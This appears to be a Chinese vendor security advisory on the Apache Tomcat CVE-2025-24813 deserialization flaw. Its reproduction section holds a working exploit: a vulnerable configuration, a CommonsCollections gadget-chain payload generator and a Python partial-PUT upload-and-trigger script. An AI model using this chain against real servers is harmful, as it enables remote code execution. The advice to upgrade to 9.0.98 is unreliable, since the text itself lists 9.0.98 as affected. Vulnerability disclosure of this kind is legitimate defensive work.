#  高危漏洞预警：Apache Tomcat远程代码执行漏洞曝光！   
原创 mag1c7  山石网科安全技术研究院   2025-05-13 05:45  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/NGIAw2Z6vnLzibrp7C4HmazCNIQXMJIRxvbibNMMmxDGrTN0Z9ibYzXnSNKobTzADCPgdo1b7ukKNARFEicHqQiajWw/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8Jb8ZACqDjPdMzgicp2SzdZ19mFnVcBO53s1uA2cSfarQkwibVUeCeH9w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
****  
****  
**Apache Tomcat曝出严重远程代码执行漏洞，攻击者可轻易控制服务器，你的系统安全吗？**  
  
****  
****  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/NGIAw2Z6vnLKuKAwMiaYedpTAYugKibaTBsHzf5pDuztECgfIgOfpG5DRF31jzhosMEj23dlx186q0zgLaIZj9lA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
在数字化时代，服务器的安全性是保障企业运营和用户数据安全的关键防线。然而，最近山石网科应急响应中心监测到一个严重的安全漏洞，Apache Tomcat的反序列化漏洞（CVE-2025-24813）可能导致远程代码执行。这意味着攻击者可以在未经许可的情况下，在服务器上执行恶意代码，从而对系统造成严重威胁。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**一、漏洞描述**  
  
  
通过Apache Tomcat中可写的Default Servlet，“file.Name”（内部点）问题可导致远程代码执行或信息泄露，或向上传文件中添加恶意内容。  
  
  
如果同时满足以下所有条件，恶意用户就能够查看安全敏感文件和/或将内容注入这些文件：  
- Default Servlet 启用写入功能（默认情况下处于禁用状态）  
  
- 支持partial PUT 操作（默认情况下处于启用状态）  
  
- 安全敏感文件上传的目标 URL 是公共文件上传目标 URL 的子目录  
  
- 攻击者知晓正在上传的安全敏感文件的名称  
  
- 安全敏感文件也通过部分 PUT 操作上传  
  
如果同时满足以下所有条件，恶意用户就能够执行远程代码：  
- Default Servlet 启用写入功能（默认情况下处于禁用状态）  
  
- 支持partial PUT操作（默认情况下处于启用状态）  
  
- 应用程序使用基于文件的 Tomcat 会话持久化，且存储位置为默认值  
  
- 应用程序包含一个可能在反序列化攻击中被利用的库  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**二、漏洞复现**  
  
  
**（一）环境搭建**  
  
****  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8WFHRW8Evk0zcqAPJSmSRktqm69UXCNGtz8L1sz1g1Wg3sEYViamG90Q/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
```
tomcat: 9.0.98
```  
  
  
pom.xml:  
  
```
<?xml version="1.0" encoding="UTF-8"?><project xmlns="http://maven.apache.org/POM/4.0.0"         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">    <modelVersion>4.0.0</modelVersion>    <groupId>com.codereview</groupId>    <artifactId>CVE-2025-24813</artifactId>    <version>1.0-SNAPSHOT</version>    <properties>        <maven.compiler.source>8</maven.compiler.source>        <maven.compiler.target>8</maven.compiler.target>        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>    </properties>    <dependencies>        <dependency>            <groupId>org.apache.tomcat.embed</groupId>            <artifactId>tomcat-embed-jasper</artifactId>            <version>9.0.98</version>        </dependency>        <!-- 对应“应用程序包含一个可能在反序列化攻击中被利用的库” -->        <dependency>            <groupId>commons-collections</groupId>            <artifactId>commons-collections</artifactId>            <version>3.1</version>        </dependency>    </dependencies></project>
```  
  
  
/WEB-INF/web.xml:  
  
```
<?xml version="1.0" encoding="UTF-8"?><web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"         version="4.0"         metadata-complete="true">    <session-config>        <session-timeout>60</session-timeout><!-- 设置会话超时时间 -->    </session-config>    <!-- Default Servlet 启用写入功能（默认情况下处于禁用状态） -->    <servlet>        <servlet-name>default</servlet-name>        <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>        <init-param>            <param-name>debug</param-name>            <param-value>0</param-value>        </init-param>        <init-param>            <param-name>listings</param-name>            <param-value>false</param-value>        </init-param>        <init-param>            <param-name>readonly</param-name>            <param-value>false</param-value>        </init-param>        <load-on-startup>1</load-on-startup>    </servlet>    <servlet-mapping>        <servlet-name>default</servlet-name>        <url-pattern>/</url-pattern>    </servlet-mapping></web-app>
```  
  
  
/META-INF/context.xml：  
  
```
<!-- 应用程序使用基于文件的 Tomcat 会话持久化，且存储位置为默认值--><Context>    <Manager className="org.apache.catalina.session.PersistentManager"              maxActiveSessions="-1"             minIdleSwap="0"             maxIdleSwap="0"             maxSwappedSessions="1000"             sessionDatabase="file"             storeOnCommit="true"             saveOnRestart="true">        <Store className="org.apache.catalina.session.FileStore"/> <!-- 不要指定存储会话的目录，使用默认目录 -->    </Manager></Context>
```  
  
  
**（二）测试**  
  
****  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8WFHRW8Evk0zcqAPJSmSRktqm69UXCNGtz8L1sz1g1Wg3sEYViamG90Q/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
生成payload:  
  
```
import org.apache.commons.collections.Transformer;  import org.apache.commons.collections.functors.ChainedTransformer;  import org.apache.commons.collections.functors.ConstantTransformer;  import org.apache.commons.collections.functors.InvokerTransformer;  import org.apache.commons.collections.map.LazyMap;  import org.apache.commons.collections4.map.DefaultedMap;  import utils.reflection.Reflection;  import utils.serialization.Serialization;  import java.io.FileInputStream;  import java.io.FileOutputStream;  import java.io.ObjectInputStream;  import java.io.ObjectOutputStream;  import java.lang.reflect.Field;  import java.util.HashMap;  import java.util.Hashtable;  import java.util.Map; /**   * chain:   * java.util.Hashtable#readObject   * java.util.Hashtable#reconstitutionPut   * org.apache.commons.collections.map.AbstractMapDecorator#equals   * java.util.AbstractMap#equals   * org.apache.commons.collections.map.LazyMap#get   * org.apache.commons.collections.functors.ChainedTransformer#transform   * ...   */public class CommonsCollections7 {      public static void main(String[] args) throws Exception {          CommonsCollections7 commonsCollections7 = new CommonsCollections7();          commonsCollections7.serialize();      }      public void serialize() throws Exception {          String cmd = "calc ";          Transformer[] transformers = new Transformer[]{              new ConstantTransformer(Runtime.class),              new InvokerTransformer(                  "getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}              ),              new InvokerTransformer(                  "invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}              ),              new InvokerTransformer(                  "exec", new Class[]{String.class}, new Object[]{cmd}              )          };          // 创建虚假的调用链          Transformer[] fakeTransformers = new Transformer[]{};          ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);          Map abstractMapDec = DefaultedMap.defaultedMap(new HashMap<>(), "test");          Map lazyMap = LazyMap.decorate(new HashMap<>(), chainedTransformer);          // hash 碰撞          abstractMapDec.put("yy", 1);          lazyMap.put("zz", 1);          Hashtable hashtable = new Hashtable<>();          hashtable.put(abstractMapDec, "AbstractMapDec");          hashtable.put(lazyMap, "lazy");          Reflection.setFieldValue(chainedTransformer, "iTransformers", transformers);          lazyMap.remove("yy");          Serialization.serialize("payload.bin", hashtable);      }  }  
```  
  
  
**（三）利用脚本**  
  
****  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8WFHRW8Evk0zcqAPJSmSRktqm69UXCNGtz8L1sz1g1Wg3sEYViamG90Q/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
```
import os  import requests  import time  # payload路径  file_path = 'payload.bin'total_size = os.path.getsize(file_path)  # 获取文件大小（字节数）  with open(file_path, 'rb') as f:      payload = f.read()  # Content-Range 触发 "partial PUT"  headers = {      'Content-Range': f'bytes 0-{total_size - 1}/{total_size}',  # 指示整个文件范围      'Content-Length': str(total_size),                          # 设置请求体的长度  }  baseurl = input("plese input the base url: ")  try:      # 上传恶意会话文件      session = requests.Session()      res = session.put(          url = f"{baseurl}/magic7/session",          headers = headers,          data = payload      )      time.sleep(4)      cookies = {          'JSESSIONID': '.magic7'# 设置 JSESSIONID Cookie      }      # 发送 GET 请求，反序列化".magic7.session"会话文件      requests.get(baseurl + "/index.jsp", cookies=cookies)  except Exception as e:      print(f"error: {e}")  # 处理其他任何异常  
```  
  
  
**（四）执行脚本**  
  
****  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8WFHRW8Evk0zcqAPJSmSRktqm69UXCNGtz8L1sz1g1Wg3sEYViamG90Q/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
成功弹出计算器：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQlNg6BCCMvSzqibsxMjSuTuDW85ickzFyfgTPNvK79Fh66yaqUObewBM6WLh4oTh19ks84ichcAGibHw/640?wx_fmt=png&from=appmsg "")  
  
  
与此同时，工作目录下出现恶意会话文件：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQlNg6BCCMvSzqibsxMjSuTulDcKkDbkBxKoa4eoALQWfNbIXFlicl9BkGAWzRfBVWntK8Mia3I9GhUA/640?wx_fmt=png&from=appmsg "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**三、漏洞评级**  
  
CVE-2025-24813  
：严重  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**四、影响版本**  
  
****- >= 11.0.0-M1, < 11.0.3  
  
- >= 10.1.0-M1, < 10.1.35  
  
- >= 9.0.0.M1, < 9.0.99  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**五、安全建议**  
  
建议用户升级到11.0.3、10.1.35或9.0.98版本，这些版本已修复该问题。  
  
如果无法立即修补，建议采取以下措施：  
  
（1）关闭default servlet的写入功能。  
  
（2）关闭partial PUT功能。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**六、相关链接**  
  
****  
  
[1]https://github.com/advisories/GHSA-83qj-6fr2-vhqg  
  
[2]https://github.com/apache/tomcat/commit/0a668e0c27f2b7ca0cc7c6eea32253b9b5ecb29c  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8KrXv9sZf93yt4huq2kARyZSgmdnic40GayohIYiaD2FAkkAqJehJSMtQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
山石网科是中国网络安全行业的技术创新领导厂商，由一批知名网络安全技术骨干于2007年创立，并以首批网络安全企业的身份，于2019年9月登陆科创板（股票简称：山石网科，股票代码：688030）。  
  
现阶段，山石网科掌握30项自主研发核心技术，申请560多项国内外专利。山石网科于2019年起，积极布局信创领域，致力于推动国内信息技术创新，并于2021年正式启动安全芯片战略。2023年进行自研ASIC安全芯片的技术研发，旨在通过自主创新，为用户提供更高效、更安全的网络安全保障。目前，山石网科已形成了具备“全息、量化、智能、协同”四大技术特点的涉及  
基础设施安全、云安全、数据安全、应用安全、安全运营、工业互联网安全、信息技术应用创新、安全服务、安全教育等九大类产品服务，50余个行业和场景的完整解决方案。  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/NGIAw2Z6vnLzibrp7C4HmazCNIQXMJIRxPibycdiaNQCI4PNojUk3eYCQDZs6c5zNMUkq7yFNeYQIxicAV33eHNdFA/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
